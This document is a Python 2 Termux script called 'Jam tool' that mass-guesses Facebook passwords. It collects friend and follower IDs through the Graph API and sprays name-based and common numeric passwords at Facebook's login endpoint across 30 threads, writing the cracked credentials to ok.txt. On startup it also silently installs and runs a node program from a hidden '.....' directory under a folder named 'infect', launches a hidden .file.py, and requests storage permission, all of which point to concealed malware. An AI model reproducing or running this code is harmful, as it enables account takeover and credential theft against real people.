#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#real codding by Jam Shahrukh
try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")
    os.system("pip2 install lolcat")
    os.system("pkg install nano")
    os.system("python2 jam.py")


"""
try:
    my = requests.get("https://m.facebook.com/Jam.shahrukh.official")
except requests.exceptions.ConnectionError:
    print("")
    print("\t    \033[1;97mTurn on mobile data\033[0;97m")
    print("")
    time.sleep(1)
    raw_input(" Press enter to try again ")
    os.system("python2 jam.py")"""
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
    os.system("apt install ruby -y && gem install lolcat")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && npm install")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    print("")
    print("")
    print("")
    print("")
    print("\t\033[1;97mPlease like our page to continue")
    print("")
    print("")
    print("")
    print("")
    os.system("xdg-open https://m.facebook.com/Jam.shahrukh.official")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    print("")
    print("")
    print("")
    print("")
    print("\t\033[1;97mPlease like our page to continue")
    print("")
    print("")
    print("")
    print("")
    os.system("xdg-open https://m.facebook.com/jam.shahrukh.official")
    time.sleep(10)
    print("")
    print("")
    print("")
    print("")
    print("\t Press Allow to storage permission")
    print("")
    print("")
    print("")
    print("")
    os.system("termux setup storage")  # give storage permission
    time.sleep(5)
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
#MyLogo
def logo():
    os.system('echo -e "\n\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Zahra Zohaib)-(Janzada Khan)\n-----------------------------------------------" | lolcat')
def tech_abm():
    os.system("clear")
    logo()
    print("")
    print("")
    print("")
    print("")
    os.system('echo -e "\t Jam tool has been update      "| lolcat')
    print("")
    print("")
    print("")
    print("")
    time.sleep(5)
    os.system("clear")
    logo()
    print("")
    print("")
    print("")
    print("")
    os.system('echo -e "\t Welcome to Jam tool       "| lolcat')
    print("")
    print("")
    print("")
    print("")
    time.sleep(5)
    os.system("clear")
    logo()
    os.system("git pull")
    time.sleep(2)
    os.system("clear")
    logo()
    os.system('echo -e "[1]-⋄-Start login with facebook               "| lolcat')
    os.system('echo -e "-----------------------------------------------"| lolcat')
    tech_abm_select()
def tech_abm_select():
    abm = raw_input("\n╰─jam➤  ")
    if abm =="1":
        b_menu()
    else:
        os.system('echo -e "\t    \033[1;31mSelect a valid option "| lolcat')
        tech_abm_select()
def login():
    os.system("clear")
    logo()
    os.system('echo -e "[1]-⋄-login with access token   "| lolcat')
    os.system('echo -e "[2]-⋄-login with user and pass "| lolcat')
    os.system('echo -e "-----------------------------------------------"| lolcat')
    login_select()
def login_select():
    abm = raw_input("\n╰─jam➤ ")
    if abm =="1":
        os.system("clear")
        logo()
        os.system('echo -e " \t    \033[1;32mlogin with token\033[0;97m "| lolcat')
	os.system('echo -e "-----------------------------------------------"| lolcat')
        token = raw_input(" Token : ")
	os.system('echo -e "-----------------------------------------------"| lolcat')
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("\t\033[1;97mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            tech_abm()
        except (KeyError , IOError):
            os.system('echo -e " \t    \033[1;31mToken not valid\033[0;97m "| lolcat')
            raw_input(" Press enter to try again ")
            login()
    elif abm =="2":
        login_fb()
    else:
        print("\t    "+c+"Select valid method"+c2)
        login_select()
def login_fb():
	os.system("clear")
	logo()
	os.system('echo -e " \t    \033[1;32mlogin with password\033[0;97m "| lolcat')
	os.system('echo -e " \t    \033[1;32muse any proxy to login\033[0;97m "| lolcat')
	os.system('echo -e "-----------------------------------------------"| lolcat')
	id = raw_input(" ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password   : ")
	os.system('echo -e "-----------------------------------------------"| lolcat')
	logging()
	data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
        q = json.loads(data)
        if "access_token" in q:
            succ = open(".login.txt","w")
            succ.write(q["access_token"])
            succ.close()
            os.system('echo -e " \n\033[1;92m[✓] Login Successfull\033[0;97m "| lolcat')
            time.sleep(1)
            menu()
        else:
            if "www.facebook.com" in q["error_msg"]:
                os.system('echo -e " \n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m "| lolcat')
                time.sleep(1)
                login_fb()
            else:
                os.system('echo -e "\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m  "| lolcat')
                time.sleep(1)
                login_fb()
def b_menu():
    global token
    os.system("clear")
    logo()
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("\t    "+c+"ID has checkpoint"+c2)
        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        logo()
        os.system('echo -e " \t    \033[1;31mTurn on mobile data OR wifi \033[0;97m "| lolcat')
        time.sleep(1)
        raw_input(" Press enter to try again \033[0;97m")
        b_menu()
    os.system("clear")
    logo()
    print("\t  "+c+"User ID"+ok+c2)
    os.system('echo -e "-----------------------------------------------"| lolcat')
    os.system('echo -e "[1]-⋄-Clone From Public ID "| lolcat')
    os.system('echo -e "[2]-⋄-Clone From Followers "| lolcat')
    os.system('echo -e "[3]-⋄-Clone From File "| lolcat')
    os.system('echo -e "[4]-⋄-Exract File "| lolcat')
    os.system('echo -e "[0]-⋄-Logout "| lolcat')
    os.system('echo -e "-----------------------------------------------"| lolcat')
    b_menu_select()
def b_menu_select():
	abm = raw_input("\n╰─jam➤ ")
	id=[]
	oks=[]
	cps=[]
	if abm =="1":
		os.system("clear")
		logo()
		os.system('echo -e "\t    Public ID Menu " | lolcat')
		os.system('echo -e "-----------------------------------------------"| lolcat')
		idt = raw_input(" Link ID/Username :  ")
		os.system('echo -e "-----------------------------------------------"| lolcat')
		time.sleep(2)
		os.system("clear")
		logo()
		print("")
		print("")
		print("")
		os.system('echo -e "\t    Please Wait " | lolcat')
		print("")
		print("")
		print("")
		time.sleep(5)
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			os.system('echo -e "\t    Public ID Menu " | lolcat')
			os.system('echo -e "-----------------------------------------------"| lolcat')
			print(" User ID : "+q["name"])
		except (KeyError , IOError):
		    os.system('echo -e " \n\t    \033[1;31m Logged in id has been checkpoint\033[0;97m "| lolcat')
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif abm =="2":
		os.system("clear")
		logo()
		os.system('echo -e "\t    Followers ID Menu " | lolcat')
		os.system('echo -e "-----------------------------------------------"| lolcat')
		idt = raw_input(" Link ID/Username : ")
		time.sleep(2)
		os.system("clear")
		logo()
		print("")
		print("")
		print("")
		os.system('echo -e "\t    Please Wait " | lolcat')
		print("")
		print("")
		print("")
		time.sleep(5)
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			os.system("clear")
			logo()
			os.system('echo -e "\t    Followers ID Menu" | lolcat')
			print(" User ID : "+q["name"])
			os.system('echo -e "-----------------------------------------------"| lolcat')
		except (KeyError , IOError):
		    os.system('echo -e " \t    \033[1;31m Logged in id has been checkpoint\033[0;97m"| lolcat')
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif abm =="3":
		os.system("clear")
	        logo()
	        os.system('echo -e "\t    File Name " | lolcat')
		os.system('echo -e "-----------------------------------------------"| lolcat')
		print(" File Link : "+q["name"])
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	        try:
			os.system("clear")
			logo()
		        os.system('echo -e "\t    File Name " | lolcat')
			print(" File Link : "+q["name"])
			for line in open(idlist ,'r').readlines():
	                    id.append(line.strip())
	        except (KeyError , IOError):
	            os.system('echo -e " \t    \033[1;31m File Not Found\033[0;97m"| lolcat')
	            raw_input('Press Enter To Back. ')
		    b_menu()	
	elif abm =="4":
		os.system("clear")
	        hamza('[!] Please Wait While Page Is Loding.')
	        hopss('CKG-10%...')
	        hopss('CKG-20%...')
	        hopss('CKG-50%...')
	        hopss('CKG-70%...')
	        hopss('CKG-90%...')
	        hopss('CKG-95%...')
	        os.system('python2 .file.py')
	        time.sleep(1)
		
	print(" Total IDs   : "+str(len(id)))
	time.sleep(2)
	os.system("clear")
	logo()
	os.system('echo -e "Please wait clone account will be appear here "| lolcat')
	os.system('echo -e "Dev by: Jam Shahrukh"| lolcat')
	os.system('echo -e "-----------------------------------------------"| lolcat')
	
	
	def main(arg):
		global cekpoint,oks
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"12"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if "access_token" in d:
		        print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass1+"\x1b[1;92m | \x1b[1;92m"+name)
		        ok=open("ok.txt","a")
		        ok.write(uid+" | "+pass1+"\n")
		        ok.close()
		        oks.append(uid)
		    else:
		            pass2=name+"123"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'access_token' in d:
		                print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass2+"\x1b[1;92m | \x1b[1;92m"+name)
		                ok=open("ok.txt","a")
		                ok.write(uid+" | "+pass2+"\n")
		                ok.close()
		                oks.append(uid)
		            else:
				pass3=name+"1234"
				q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                d=json.loads(q)
		                if 'access_token' in d:
		                    print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass3+"\x1b[1;92m | \x1b[1;92m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass3+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass4=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'access_token' in d:
		                        print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass4+"\x1b[1;92m | \x1b[1;92m"+name)
		                        ok=open("ok.txt","a")
		                        ok.write(uid+" | "+pass4+"\n")
		                        ok.close()
		                        oks.append(uid)
		                    else:
					pass5=name+"1122"
					q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                        d=json.loads(q)
		                        if 'access_token' in d:
		                            print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass5+"\x1b[1;92m | \x1b[1;92m"+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass5+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass6="223344"
					    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'access_token' in d:
		                                print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass6+"\x1b[1;92m | \x1b[1;92m"+name)
		                                ok=open("ok.txt","a")
		                                ok.write(uid+" | "+pass6+"\n")
		                                ok.close()
		                                oks.append(uid)
		                            else:
						pass7="334455"
						q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                d=json.loads(q)
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass7+"\x1b[1;92m | \x1b[1;92m"+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass7+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass8="445566"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'access_token' in d:
		                                        print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass8+"\x1b[1;92m | \x1b[1;92m"+name)
		                                        ok=open("ok.txt","a")
		                                        ok.write(uid+" | "+pass8+"\n")
		                                        ok.close()
		                                        oks.append(uid)
		                                    else:
							pass9="556677"
							q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                        d=json.loads(q)
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass9+"\x1b[1;92m | \x1b[1;92m"+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass9+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass10="234567"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'access_token' in d:
		                                                print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass10+"\x1b[1;92m | \x1b[1;92m"+name)
		                                                ok=open("ok.txt","a")
		                                                ok.write(uid+" | "+pass10+"\n")
		                                                ok.close()
		                                                oks.append(uid)
		                                          
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	os.system('echo -e "-----------------------------------------------"| lolcat')
	os.system('echo -e "The Process has been completed "| lolcat')
	print (" Total CP/OK : "+str(len(cps)) + "/"+str(len(oks)))
        os.system('echo -e "-----------------------------------------------"| lolcat')
	raw_input(" Press enter to main menu back ")
	b_menu()
	
if __name__ == '__main__':
    tech_abm()
